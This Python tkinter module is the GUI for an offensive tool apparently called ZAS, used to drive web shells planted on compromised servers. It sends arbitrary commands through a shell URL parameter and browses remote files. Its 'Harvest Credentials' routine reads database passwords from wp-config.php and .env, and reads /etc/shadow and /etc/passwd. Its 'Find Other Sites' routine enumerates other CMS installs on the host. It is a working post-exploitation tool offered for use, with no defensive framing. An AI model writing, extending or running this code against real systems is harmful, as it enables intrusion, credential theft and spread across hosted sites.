"""
Shell Exploiter Tabs - Integrated into ZAS GUI
Each tab is an independent shell session with Console, Command, Files, Credentials, Sites.
"""

import threading
import tkinter as tk
from tkinter import ttk, scrolledtext


class ShellTab:
    """Single shell session tab with multiple sub-tabs."""
    
    def __init__(self, parent, shell_url, token=None, cve="", url="", on_close=None, exploit_func=None):
        self.parent = parent
        self.shell_url = shell_url
        self.token = token
        self.cve = cve
        self.url = url
        self.on_close = on_close
        self.connected = True
        self.history = []
        self.exploit_func = exploit_func  # For pseudo-shell (re-exploit each command)
        self.is_pseudo = exploit_func is not None
        
        # Main frame - ZAS theme
        self.frame = tk.Frame(parent, bg="#0a0d0b")
        
        # Header bar
        header = tk.Frame(self.frame, bg="#0d1110", height=40)
        header.pack(fill="x")
        header.pack_propagate(False)
        
        # Connection info
        info_text = f"Shell: {shell_url[:60]}..."
        if cve:
            info_text = f"[{cve}] {info_text}"
        tk.Label(header, text=info_text, font=("Consolas", 9),
                 fg="#58a6ff", bg="#0d1110").pack(side="left", padx=10)
        
        # Status dot
        self.status_dot = tk.Label(header, text="● Connected", font=("Consolas", 9),
                                   fg="#3fb950", bg="#0d1110")
        self.status_dot.pack(side="right", padx=10)
        
        # Sub-tabs
        self.notebook = ttk.Notebook(self.frame)
        self.notebook.pack(fill="both", expand=True)
        
        # Console tab
        self._create_console_tab()
        
        # Command tab
        self._create_command_tab()
        
        # Files tab
        self._create_files_tab()
        
        # Credentials tab
        self._create_creds_tab()
        
        # Sites tab
        self._create_sites_tab()
        
        # Initial connection test
        self._test_connection()
    
    def _create_console_tab(self):
        """Console output tab."""
        frame = tk.Frame(self.notebook, bg="#080a08")
        self.console_text = scrolledtext.ScrolledText(
            frame, bg="#080a08", fg="#c9ff45", font=("Consolas", 9),
            insertbackground="#00ff00", relief="flat"
        )
        self.console_text.pack(fill="both", expand=True)
        self.notebook.add(frame, text="Console")
        
        self._log_console("[*] Shell session initialized")
        self._log_console(f"[*] URL: {self.shell_url}")
        if self.token:
            self._log_console(f"[*] Token: {self.token[:16]}...")
    
    def _create_command_tab(self):
        """Command execution tab."""
        frame = tk.Frame(self.notebook, bg="#0a0d0b")
        
        # Command bar
        cmd_bar = tk.Frame(frame, bg="#0d1110", height=35)
        cmd_bar.pack(fill="x")
        cmd_bar.pack_propagate(False)
        
        tk.Label(cmd_bar, text="$", font=("Consolas", 12, "bold"),
                 fg="#c9ff45", bg="#0d1110").pack(side="left", padx=(10, 5))
        
        self.cmd_entry = tk.Entry(cmd_bar, bg="#1a1a2e", fg="#e0e0e0",
                                  insertbackground="#e0e0e0", relief="flat",
                                  font=("Consolas", 10))
        self.cmd_entry.pack(side="left", fill="x", expand=True, padx=5, pady=5)
        self.cmd_entry.bind("<Return>", lambda e: self._exec_command())
        
        run_btn = tk.Button(cmd_bar, text="Run", bg="#e94560", fg="white",
                           relief="flat", font=("Segoe UI", 9, "bold"),
                           command=self._exec_command)
        run_btn.pack(side="right", padx=5, pady=5)
        
        # Output
        self.cmd_output = scrolledtext.ScrolledText(
            frame, bg="#080a08", fg="#c9ff45", font=("Consolas", 9),
            insertbackground="#00ff00", relief="flat"
        )
        self.cmd_output.pack(fill="both", expand=True)
        
        self.notebook.add(frame, text="Command")
    
    def _create_files_tab(self):
        """File browser tab."""
        frame = tk.Frame(self.notebook, bg="#0a0d0b")
        
        # Path bar
        path_bar = tk.Frame(frame, bg="#0d1110", height=35)
        path_bar.pack(fill="x")
        path_bar.pack_propagate(False)
        
        tk.Label(path_bar, text="Path:", font=("Segoe UI", 9),
                 fg="#8b949e", bg="#0d1110").pack(side="left", padx=10)
        
        self.file_path = tk.Entry(path_bar, bg="#1a1a2e", fg="#e0e0e0",
                                  insertbackground="#e0e0e0", relief="flat",
                                  font=("Consolas", 10))
        self.file_path.insert(0, "/")
        self.file_path.pack(side="left", fill="x", expand=True, padx=5, pady=5)
        
        go_btn = tk.Button(path_bar, text="Go", bg="#0f3460", fg="white",
                          relief="flat", command=self._browse_files)
        go_btn.pack(side="right", padx=5, pady=5)
        
        # File list
        self.file_tree = ttk.Treeview(frame, columns=("Name", "Size", "Perms"),
                                      show="headings", height=15)
        self.file_tree.heading("Name", text="Name")
        self.file_tree.heading("Size", text="Size")
        self.file_tree.heading("Perms", text="Perms")
        self.file_tree.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.notebook.add(frame, text="Files")
    
    def _create_creds_tab(self):
        """Credentials tab."""
        frame = tk.Frame(self.notebook, bg="#0a0d0b")
        
        self.creds_tree = ttk.Treeview(frame, columns=("Source", "Type", "Value"),
                                       show="headings", height=15)
        self.creds_tree.heading("Source", text="Source")
        self.creds_tree.heading("Type", text="Type")
        self.creds_tree.heading("Value", text="Value")
        self.creds_tree.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Harvest button
        btn_frame = tk.Frame(frame, bg="#0a0d0b")
        btn_frame.pack(fill="x", padx=5, pady=5)
        
        harvest_btn = tk.Button(btn_frame, text="Harvest Credentials", bg="#e94560",
                               fg="white", relief="flat", command=self._harvest_creds)
        harvest_btn.pack(side="left")
        
        self.notebook.add(frame, text="Credentials")
    
    def _create_sites_tab(self):
        """Other sites tab."""
        frame = tk.Frame(self.notebook, bg="#0a0d0b")
        
        self.sites_tree = ttk.Treeview(frame, columns=("Path", "CMS", "Config"),
                                       show="headings", height=15)
        self.sites_tree.heading("Path", text="Path")
        self.sites_tree.heading("CMS", text="CMS")
        self.sites_tree.heading("Config", text="Config")
        self.sites_tree.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Find sites button
        btn_frame = tk.Frame(frame, bg="#0a0d0b")
        btn_frame.pack(fill="x", padx=5, pady=5)
        
        find_btn = tk.Button(btn_frame, text="Find Other Sites", bg="#e94560",
                            fg="white", relief="flat", command=self._find_sites)
        find_btn.pack(side="left")
        
        self.notebook.add(frame, text="Sites")
    
    def _log_console(self, msg):
        """Log message to console."""
        self.console_text.insert("end", msg + "\n")
        self.console_text.see("end")
    
    def _exec_command(self):
        """Execute command via shell (real or pseudo)."""
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        
        self.cmd_output.insert("end", f"$ {cmd}\n")
        self.cmd_output.see("end")
        self.cmd_entry.delete(0, "end")
        
        if self.is_pseudo:
            # Pseudo-shell: re-exploit each time
            def run_pseudo():
                try:
                    result = self.exploit_func(cmd)
                    output = result.get("output", "No output")
                    self.frame.after(0, lambda: self._cmd_output(output))
                except Exception as e:
                    self.frame.after(0, lambda e=e: self._cmd_output(f"Error: {e}"))
            threading.Thread(target=run_pseudo, daemon=True).start()
        else:
            # Real shell: direct execution
            def run_real():
                try:
                    import urllib.request
                    import urllib.parse
                    
                    base_url = self.shell_url
                    params = {}
                    if self.token:
                        params["t"] = self.token
                    params["c"] = cmd
                    
                    sep = "&" if "?" in base_url else "?"
                    param_str = "&".join(f"{k}={urllib.parse.quote(str(v))}" for k, v in params.items())
                    url = f"{base_url}{sep}{param_str}"
                    
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    resp = urllib.request.urlopen(req, timeout=15)
                    output = resp.read().decode("utf-8", errors="replace").strip()
                    
                    self.frame.after(0, lambda: self._cmd_output(output))
                except Exception as e:
                    self.frame.after(0, lambda e=e: self._cmd_output(f"Error: {e}"))
            threading.Thread(target=run_real, daemon=True).start()
    
    def _cmd_output(self, output):
        """Display command output."""
        self.cmd_output.insert("end", output + "\n\n")
        self.cmd_output.see("end")
        self.history.append(output)
    
    def _browse_files(self):
        """Browse files on remote server."""
        path = self.file_path.get().strip()
        if not path:
            path = "/"
        
        def run():
            try:
                cmd = f"ls -la {path}"
                import urllib.request
                import urllib.parse
                
                url = self.shell_url
                if self.token:
                    sep = "&" if "?" in url else "?"
                    url = f"{url}{sep}t={self.token}"
                
                sep = "&" if "?" in url else "?"
                url = f"{url}{sep}c={urllib.parse.quote(cmd)}"
                
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                resp = urllib.request.urlopen(req, timeout=15)
                output = resp.read().decode("utf-8", errors="replace").strip()
                
                self.frame.after(0, lambda: self._update_files(output))
            except Exception as e:
                self.frame.after(0, lambda e=e: self._log_console(f"[!] File browse error: {e}"))
        
        threading.Thread(target=run, daemon=True).start()
    
    def _update_files(self, ls_output):
        """Update file tree with ls output."""
        self.file_tree.delete(*self.file_tree.get_children())
        
        for line in ls_output.split("\n"):
            line = line.strip()
            if not line or line.startswith("total"):
                continue
            
            parts = line.split()
            if len(parts) >= 9:
                perms = parts[0]
                size = parts[4]
                name = " ".join(parts[8:])
                self.file_tree.insert("", "end", values=(name, size, perms))
    
    def _harvest_creds(self):
        """Harvest credentials from common locations."""
        self.creds_tree.delete(*self.creds_tree.get_children())
        
        cmds = [
            ("wp-config.php", "cat wp-config.php 2>/dev/null | grep -E 'DB_USER|DB_PASSWORD|DB_HOST'"),
            (".env", "cat .env 2>/dev/null | grep -E 'DB_|PASSWORD|SECRET|KEY'"),
            ("config.php", "find / -name 'config.php' -type f 2>/dev/null | head -5"),
            ("shadow", "cat /etc/shadow 2>/dev/null | head -3"),
            ("passwd", "cat /etc/passwd 2>/dev/null | head -10"),
        ]
        
        def run():
            for source, cmd in cmds:
                try:
                    import urllib.request
                    import urllib.parse
                    
                    url = self.shell_url
                    if self.token:
                        sep = "&" if "?" in url else "?"
                        url = f"{url}{sep}t={self.token}"
                    
                    sep = "&" if "?" in url else "?"
                    url = f"{url}{sep}c={urllib.parse.quote(cmd)}"
                    
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    resp = urllib.request.urlopen(req, timeout=10)
                    output = resp.read().decode("utf-8", errors="replace").strip()
                    
                    if output and "error" not in output.lower()[:20]:
                        for line in output.split("\n")[:5]:
                            if ":" in line:
                                parts = line.split(":", 2)
                                if len(parts) >= 2:
                                    self.frame.after(0, lambda s=source, t=parts[0], v=parts[1]: 
                                        self.creds_tree.insert("", "end", values=(s, t, v)))
                except:
                    pass
        
        threading.Thread(target=run, daemon=True).start()
    
    def _find_sites(self):
        """Find other sites on the server."""
        self.sites_tree.delete(*self.sites_tree.get_children())
        
        cmds = [
            "find /var/www -name 'wp-config.php' -type f 2>/dev/null",
            "find /home -name 'wp-config.php' -type f 2>/dev/null",
            "find /var/www -name 'configuration.php' -type f 2>/dev/null",
            "ls -la /var/www/ 2>/dev/null",
            "ls -la /home/ 2>/dev/null",
        ]
        
        def run():
            for cmd in cmds:
                try:
                    import urllib.request
                    import urllib.parse
                    
                    url = self.shell_url
                    if self.token:
                        sep = "&" if "?" in url else "?"
                        url = f"{url}{sep}t={self.token}"
                    
                    sep = "&" if "?" in url else "?"
                    url = f"{url}{sep}c={urllib.parse.quote(cmd)}"
                    
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    resp = urllib.request.urlopen(req, timeout=10)
                    output = resp.read().decode("utf-8", errors="replace").strip()
                    
                    if output:
                        for line in output.split("\n")[:10]:
                            line = line.strip()
                            if line and not line.startswith("total"):
                                cms = "WordPress" if "wp-config" in cmd else "Joomla" if "configuration.php" in cmd else "Unknown"
                                self.frame.after(0, lambda p=line, c=cms: 
                                    self.sites_tree.insert("", "end", values=(p, c, "")))
                except:
                    pass
        
        threading.Thread(target=run, daemon=True).start()
    
    def _test_connection(self):
        """Test shell connection."""
        def run():
            try:
                import urllib.request
                import urllib.parse
                
                url = self.shell_url
                if self.token:
                    sep = "&" if "?" in url else "?"
                    url = f"{url}{sep}t={self.token}"
                
                sep = "&" if "?" in url else "?"
                url = f"{url}{sep}c=echo ZAS_TEST"
                
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                resp = urllib.request.urlopen(req, timeout=10)
                output = resp.read().decode("utf-8", errors="replace").strip()
                
                if "ZAS_TEST" in output:
                    self.frame.after(0, lambda: self._log_console("[+] Connection verified"))
                    self.frame.after(0, lambda: self.status_dot.configure(fg="#3fb950", text="● Connected"))
                else:
                    self.frame.after(0, lambda: self._log_console("[!] Connection test failed"))
                    self.frame.after(0, lambda: self.status_dot.configure(fg="#f85149", text="● Error"))
            except Exception as e:
                self.frame.after(0, lambda e=e: self._log_console(f"[!] Connection error: {e}"))
                self.frame.after(0, lambda: self.status_dot.configure(fg="#f85149", text="● Disconnected"))
        
        threading.Thread(target=run, daemon=True).start()
    
    def destroy(self):
        """Clean up tab."""
        self.connected = False
        self.frame.destroy()
        if self.on_close:
            self.on_close(self)


class ShellTabManager:
    """Manages multiple shell tabs with Chrome-style closeable tabs."""
    
    def __init__(self, parent):
        self.parent = parent
        self.tabs = []
        self.tab_buttons = []
        
        # Tab bar frame
        self.tab_bar = tk.Frame(parent, bg="#0d1110", height=35)
        self.tab_bar.pack(fill="x")
        self.tab_bar.pack_propagate(False)
        
        # Tab buttons container
        self.tab_buttons_frame = tk.Frame(self.tab_bar, bg="#0d1110")
        self.tab_buttons_frame.pack(side="left", fill="x", expand=True)
        
        # Content area
        self.content_frame = tk.Frame(parent, bg="#0a0d0b")
        self.content_frame.pack(fill="both", expand=True)
        
        # Current active tab
        self.active_tab = None
        
        # Empty state
        self.empty_label = tk.Label(self.content_frame, 
                                    text="No shell sessions\n\nStart a scan in Exploit mode to obtain shells.\nSuccessful exploits will show a [+] button to open a shell tab.",
                                    font=("Segoe UI", 12), fg="#8b949e", bg="#0a0d0b",
                                    justify="center")
        self.empty_label.pack(expand=True)
    
    def add_tab(self, shell_url, token=None, cve="", url="", exploit_func=None):
        """Add a new shell tab. If exploit_func provided, creates pseudo-shell."""
        # Create tab
        tab = ShellTab(self.content_frame, shell_url, token, cve, url, 
                       on_close=self._on_tab_close, exploit_func=exploit_func)
        tab_id = len(self.tabs)
        self.tabs.append(tab)
        
        # Create tab button
        btn_frame = tk.Frame(self.tab_buttons_frame, bg="#1a1a2e", relief="flat")
        btn_frame.pack(side="left", padx=1)
        
        # Tab label
        label_text = f"Shell {tab_id + 1}"
        if cve:
            label_text = cve[:15]
        
        label = tk.Label(btn_frame, text=label_text, font=("Segoe UI", 9),
                         fg="#e0e0e0", bg="#1a1a2e", padx=8, pady=4)
        label.pack(side="left")
        
        # Close button - use lambda with tab_id to avoid reference issues
        close_btn = tk.Label(btn_frame, text="×", font=("Segoe UI", 11, "bold"),
                            fg="#8b949e", bg="#1a1a2e", padx=4, pady=4, cursor="hand2")
        close_btn.pack(side="right")
        
        # Bind close button with proper closure
        def close_handler(e, tid=tab_id, bf=btn_frame):
            self._close_tab_by_id(tid, bf)
        close_btn.bind("<Button-1>", close_handler)
        
        # Click to select
        def select_handler(e, tid=tab_id, bf=btn_frame):
            self._select_tab_by_id(tid, bf)
        btn_frame.bind("<Button-1>", select_handler)
        label.bind("<Button-1>", select_handler)
        
        self.tab_buttons.append((btn_frame, tab_id))
        
        # Select this tab
        self._select_tab_by_id(tab_id, btn_frame)
        
        # Hide empty state
        self.empty_label.pack_forget()
        
        return tab
    
    def _select_tab_by_id(self, tab_id, btn_frame):
        """Select a tab by ID."""
        if tab_id >= len(self.tabs):
            return
        
        # Hide all tabs
        for t in self.tabs:
            t.frame.pack_forget()
        
        # Show selected tab
        self.tabs[tab_id].frame.pack(fill="both", expand=True)
        self.active_tab = self.tabs[tab_id]
        
        # Update button styles
        for bf, tid in self.tab_buttons:
            bf.configure(bg="#1a1a2e")
            for child in bf.winfo_children():
                child.configure(bg="#1a1a2e")
        
        btn_frame.configure(bg="#0f0c29")
        for child in btn_frame.winfo_children():
            child.configure(bg="#0f0c29")
    
    def _close_tab_by_id(self, tab_id, btn_frame):
        """Close a tab by ID."""
        if tab_id >= len(self.tabs):
            return
        
        # Remove tab
        tab = self.tabs[tab_id]
        tab.destroy()
        self.tabs.pop(tab_id)
        
        # Remove button
        btn_frame.destroy()
        self.tab_buttons = [(bf, tid) for bf, tid in self.tab_buttons if tid != tab_id]
        
        # Renumber remaining tabs
        self.tab_buttons = [(bf, i) for i, (bf, tid) in enumerate(self.tab_buttons)]
        
        # Select another tab or show empty state
        if self.tabs:
            bf, tid = self.tab_buttons[-1]
            self._select_tab_by_id(tid, bf)
        else:
            self.active_tab = None
            self.empty_label.pack(expand=True)
    
    def _on_tab_close(self, tab):
        """Callback when tab is closed."""
        if tab in self.tabs:
            self.tabs.remove(tab)
        
        if not self.tabs:
            self.active_tab = None
            self.empty_label.pack(expand=True)
    
    def get_tab_count(self):
        """Get number of open tabs."""
        return len(self.tabs)
